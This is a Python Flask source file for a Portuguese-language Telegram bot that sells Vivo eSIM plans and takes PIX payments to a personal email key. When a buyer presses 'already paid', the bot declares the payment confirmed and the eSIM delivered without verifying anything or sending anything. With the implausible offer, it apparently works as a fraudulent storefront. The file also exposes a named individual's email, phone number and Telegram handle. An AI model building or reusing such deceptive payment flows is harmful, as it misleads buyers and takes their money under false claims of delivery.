import os
import json
import logging
import qrcode
import io
import random
import threading
import time
from datetime import datetime
from flask import Flask, request, jsonify
import requests

# ========== CONFIGURAÇÃO ==========
TOKEN = os.getenv('TELEGRAM_TOKEN')
TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"

# Flask app
app = Flask(__name__)

# ========== DADOS ==========
PLANOS = {
    '31': 'VIVO DDD 31 - R$20',
    '21': 'VIVO DDD 21 - R$20', 
    '55': 'VIVO DDD 55 - R$20'
}

carrinhos = {}
usuarios = {}

# ========== FUNÇÕES TELEGRAM ==========
def enviar_mensagem(chat_id, texto, reply_markup=None):
    """Envia mensagem para Telegram"""
    url = f"{TELEGRAM_API}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': texto,
        'parse_mode': 'Markdown'
    }
    
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"Erro ao enviar mensagem: {e}")
        return None

def enviar_foto(chat_id, foto_bytes, legenda=""):
    """Envia foto para Telegram"""
    url = f"{TELEGRAM_API}/sendPhoto"
    
    files = {'photo': ('qr.png', foto_bytes, 'image/png')}
    data = {
        'chat_id': chat_id,
        'caption': legenda,
        'parse_mode': 'Markdown'
    }
    
    try:
        response = requests.post(url, files=files, data=data)
        return response.json()
    except Exception as e:
        print(f"Erro ao enviar foto: {e}")
        return None

def responder_callback(callback_id):
    """Responde a callback query"""
    url = f"{TELEGRAM_API}/answerCallbackQuery"
    payload = {
        'callback_query_id': callback_id
    }
    requests.post(url, json=payload)

def editar_mensagem(chat_id, message_id, texto, reply_markup=None):
    """Edita mensagem existente"""
    url = f"{TELEGRAM_API}/editMessageText"
    payload = {
        'chat_id': chat_id,
        'message_id': message_id,
        'text': texto,
        'parse_mode': 'Markdown'
    }
    
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"Erro ao editar mensagem: {e}")
        return None

# ========== FUNÇÕES DO BOT ==========
def gerar_qr_pix(valor, pedido_id):
    """Gera QR Code PIX"""
    qr = qrcode.QRCode(box_size=10, border=4)
    qr.add_data(f"PIX:gaila191h@gmail.com:{valor}:{pedido_id}")
    qr.make(fit=True)
    
    img = qr.make_image(fill_color="black", back_color="white")
    img_bytes = io.BytesIO()
    img.save(img_bytes, format='PNG')
    img_bytes.seek(0)
    return img_bytes.getvalue()

def gerar_pedido_id():
    return f"ESIM{random.randint(1000, 9999)}"

# ========== HANDLERS ==========
def handle_start(chat_id, user_id, nome):
    """Handler do comando /start"""
    if user_id not in carrinhos:
        carrinhos[user_id] = []
    
    qtd = len(carrinhos[user_id])
    
    keyboard = {
        'inline_keyboard': [
            [{'text': '📱 VER PLANOS', 'callback_data': 'planos'}],
            [{'text': f'🛒 CARRINHO ({qtd})', 'callback_data': 'carrinho'}],
            [{'text': '🆘 SUPORTE', 'callback_data': 'suporte'}]
        ]
    }
    
    texto = f"👋 Olá *{nome}*!\n\n"
    texto += "🛍️ *LOJA E-SIM VIVO*\n"
    texto += "💰 *Valor:* R$20,00\n"
    texto += "📍 *DDDs:* 31, 21, 55\n"
    texto += "💾 *Dados:* 66GB cada\n"
    texto += "⚡ *Ativação:* Imediata\n\n"
    texto += "Escolha uma opção:"
    
    enviar_mensagem(chat_id, texto, keyboard)

def handle_planos(chat_id, message_id, user_id):
    """Mostra planos disponíveis"""
    keyboard = {
        'inline_keyboard': [
            [{'text': '📱 VIVO DDD 31 - R$20', 'callback_data': 'add_31'}],
            [{'text': '📱 VIVO DDD 21 - R$20', 'callback_data': 'add_21'}],
            [{'text': '📱 VIVO DDD 55 - R$20', 'callback_data': 'add_55'}],
            [{'text': '⬅️ VOLTAR', 'callback_data': 'menu'}]
        ]
    }
    
    texto = "📋 *PLANOS DISPONÍVEIS:*\n\n"
    texto += "1️⃣ *VIVO DDD 31* - R$20,00\n"
    texto += "2️⃣ *VIVO DDD 21* - R$20,00\n"
    texto += "3️⃣ *VIVO DDD 55* - R$20,00\n\n"
    texto += "Todos com 66GB de internet."
    
    editar_mensagem(chat_id, message_id, texto, keyboard)

def handle_add_carrinho(chat_id, message_id, user_id, ddd):
    """Adiciona item ao carrinho"""
    if user_id not in carrinhos:
        carrinhos[user_id] = []
    
    carrinhos[user_id].append(ddd)
    qtd = len(carrinhos[user_id])
    
    keyboard = {
        'inline_keyboard': [
            [{'text': f'🛒 VER CARRINHO ({qtd})', 'callback_data': 'carrinho'}],
            [{'text': '➕ ADICIONAR MAIS', 'callback_data': 'planos'}],
            [{'text': f'💰 FINALIZAR (R${qtd * 20})', 'callback_data': 'pagar'}]
        ]
    }
    
    texto = f"✅ *{PLANOS[ddd]}* adicionado!\n\n"
    texto += f"*Itens no carrinho:* {qtd}\n"
    texto += f"*Total parcial:* R${qtd * 20},00"
    
    editar_mensagem(chat_id, message_id, texto, keyboard)

def handle_carrinho(chat_id, message_id, user_id):
    """Mostra carrinho"""
    if user_id not in carrinhos or not carrinhos[user_id]:
        keyboard = {
            'inline_keyboard': [[{'text': '📱 VER PLANOS', 'callback_data': 'planos'}]]
        }
        editar_mensagem(chat_id, message_id, "🛒 *Carrinho vazio*", keyboard)
        return
    
    itens = carrinhos[user_id]
    total = len(itens) * 20
    
    keyboard = {
        'inline_keyboard': [
            [{'text': f'💰 PAGAR R${total},00', 'callback_data': 'pagar'}],
            [{'text': '🗑️ LIMPAR CARRINHO', 'callback_data': 'limpar'}],
            [{'text': '📱 CONTINUAR COMPRANDO', 'callback_data': 'planos'}]
        ]
    }
    
    texto = "🛒 *SEU CARRINHO*\n\n"
    for ddd in itens:
        texto += f"• {PLANOS[ddd]}\n"
    
    texto += f"\n*Quantidade:* {len(itens)} item(s)\n"
    texto += f"💰 *Total:* R${total},00\n\n"
    texto += "Clique em PAGAR para finalizar."
    
    editar_mensagem(chat_id, message_id, texto, keyboard)

def handle_pagar(chat_id, user_id):
    """Processa pagamento"""
    if user_id not in carrinhos or not carrinhos[user_id]:
        enviar_mensagem(chat_id, "❌ Seu carrinho está vazio!")
        return
    
    pedido_id = gerar_pedido_id()
    total = len(carrinhos[user_id]) * 20
    
    # Gerar QR Code
    qr_img = gerar_qr_pix(total, pedido_id)
    
    # Enviar QR Code
    enviar_foto(
        chat_id, 
        qr_img,
        f"💰 *QR CODE PIX*\n\n*Pedido:* #{pedido_id}\n*Valor:* R${total},00"
    )
    
    # Enviar instruções
    keyboard = {
        'inline_keyboard': [[{'text': '✅ JÁ PAGUEI', 'callback_data': f'pago_{pedido_id}'}]]
    }
    
    texto = "📋 *INSTRUÇÕES DE PAGAMENTO*\n\n"
    texto += f"*Pedido:* #{pedido_id}\n"
    texto += f"*Valor:* R${total},00\n"
    texto += "*Chave PIX:* gaila191h@gmail.com\n"
    texto += "*Nome:* Solineia Guimaraes\n"
    texto += "*Cidade:* Belo Horizonte\n\n"
    texto += "1. Abra seu app bancário\n"
    texto += "2. Pague via PIX\n"
    texto += "3. Clique em JÁ PAGUEI\n\n"
    texto += "Dúvidas? WhatsApp: 33 98451-8052"
    
    enviar_mensagem(chat_id, texto, keyboard)

def handle_confirmar_pagamento(chat_id, message_id, user_id, pedido_id):
    """Confirma pagamento"""
    if user_id in carrinhos:
        carrinhos[user_id] = []
    
    keyboard = {
        'inline_keyboard': [
            [{'text': '📱 COMPRAR MAIS', 'callback_data': 'planos'}],
            [{'text': '🆘 SUPORTE', 'callback_data': 'suporte'}]
        ]
    }
    
    texto = f"✅ *PAGAMENTO CONFIRMADO!*\n\n"
    texto += f"*Pedido:* #{pedido_id}\n"
    texto += "*Status:* ✅ Entregue\n"
    texto += f"*Data:* {datetime.now().strftime('%d/%m/%Y %H:%M')}\n\n"
    texto += "Seu eSIM foi enviado com sucesso!"
    
    editar_mensagem(chat_id, message_id, texto, keyboard)

def handle_suporte(chat_id, message_id):
    """Menu de suporte"""
    keyboard = {
        'inline_keyboard': [
            [
                {'text': '📱 WHATSAPP', 'url': 'https://wa.me/5533984518052'},
                {'text': '🤖 TELEGRAM', 'url': 'https://t.me/Drwed33'}
            ],
            [
                {'text': '📧 EMAIL', 'url': 'mailto:gaila191h@gmail.com'}
            ],
            [{'text': '⬅️ VOLTAR', 'callback_data': 'menu'}]
        ]
    }
    
    texto = "🆘 *SUPORTE TÉCNICO*\n\n"
    texto += "*WhatsApp:* 33 98451-8052\n"
    texto += "*Telegram:* @Drwed33\n"
    texto += "*Email:* gaila191h@gmail.com\n\n"
    texto += "*Horário:* 8h às 20h\n"
    texto += "*Responsável:* Solineia Guimaraes"
    
    editar_mensagem(chat_id, message_id, texto, keyboard)

def handle_menu(chat_id, message_id, user_id):
    """Volta ao menu principal"""
    qtd = len(carrinhos.get(user_id, []))
    
    keyboard = {
        'inline_keyboard': [
            [{'text': '📱 VER PLANOS', 'callback_data': 'planos'}],
            [{'text': f'🛒 CARRINHO ({qtd})', 'callback_data': 'carrinho'}],
            [{'text': '🆘 SUPORTE', 'callback_data': 'suporte'}]
        ]
    }
    
    texto = "🛍️ *MENU PRINCIPAL*\n\n"
    texto += "Escolha uma opção:"
    
    editar_mensagem(chat_id, message_id, texto, keyboard)

def handle_limpar(chat_id, message_id, user_id):
    """Limpa carrinho"""
    if user_id in carrinhos:
        carrinhos[user_id] = []
    
    # Enviar alerta
    url = f"{TELEGRAM_API}/answerCallbackQuery"
    payload = {
        'callback_query_id': 'temp_id',
        'text': '🛒 Carrinho limpo!',
        'show_alert': True
    }
    requests.post(url, json=payload)
    
    # Mostrar carrinho vazio
    handle_carrinho(chat_id, message_id, user_id)

# ========== WEBHOOK ENDPOINT ==========
@app.route('/webhook', methods=['POST'])
def webhook():
    """Endpoint do webhook do Telegram"""
    try:
        data = request.get_json()
        
        if 'message' in data:
            message = data['message']
            chat_id = message['chat']['id']
            user_id = str(message['from']['id'])
            nome = message['from'].get('first_name', 'Cliente')
            
            if 'text' in message:
                texto = message['text']
                
                if texto == '/start':
                    handle_start(chat_id, user_id, nome)
                elif texto == '/suporte':
                    handle_suporte(chat_id, message['message_id'])
        
        elif 'callback_query' in data:
            callback = data['callback_query']
            callback_id = callback['id']
            chat_id = callback['message']['chat']['id']
            message_id = callback['message']['message_id']
            user_id = str(callback['from']['id'])
            data_callback = callback['data']
            
            # Responder callback
            responder_callback(callback_id)
            
            # Processar callback
            if data_callback == 'planos':
                handle_planos(chat_id, message_id, user_id)
            elif data_callback.startswith('add_'):
                ddd = data_callback.split('_')[1]
                handle_add_carrinho(chat_id, message_id, user_id, ddd)
            elif data_callback == 'carrinho':
                handle_carrinho(chat_id, message_id, user_id)
            elif data_callback == 'pagar':
                handle_pagar(chat_id, user_id)
            elif data_callback.startswith('pago_'):
                pedido_id = data_callback.split('_')[1]
                handle_confirmar_pagamento(chat_id, message_id, user_id, pedido_id)
            elif data_callback == 'suporte':
                handle_suporte(chat_id, message_id)
            elif data_callback == 'menu':
                handle_menu(chat_id, message_id, user_id)
            elif data_callback == 'limpar':
                handle_limpar(chat_id, message_id, user_id)
        
        return jsonify({'status': 'ok'}), 200
    
    except Exception as e:
        print(f"Erro no webhook: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/')
def home():
    return "🤖 Bot eSIM VIVO Online - R$20"

@app.route('/health')
def health():
    return "✅ Bot está online", 200

@app.route('/setwebhook')
def set_webhook():
    """Configura webhook (rodar uma vez)"""
    webhook_url = f"https://{request.host}/webhook"
    url = f"{TELEGRAM_API}/setWebhook"
    payload = {'url': webhook_url}
    
    response = requests.post(url, json=payload)
    return jsonify(response.json())

# ========== INICIAR BOT ==========
def iniciar_bot():
    """Inicia o bot verificando mensagens periodicamente"""
    print("🤖 Bot eSIM VIVO iniciado!")
    print("💰 Valor: R$20,00")
    print("📍 DDDs: 31, 21, 55")
    print("💾 Dados: 66GB cada")
    print("⚡ Ativação: Imediata")

def main():
    """Função principal"""
    iniciar_bot()
    
    # Rodar Flask
    port = int(os.environ.get('PORT', 5000))
    print(f"🌐 Servidor iniciado na porta {port}")
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )
    
    if not TOKEN:
        print("❌ ERRO: TELEGRAM_TOKEN não configurado!")
        print("⚠️ Configure a variável TELEGRAM_TOKEN")
    else:
        main()
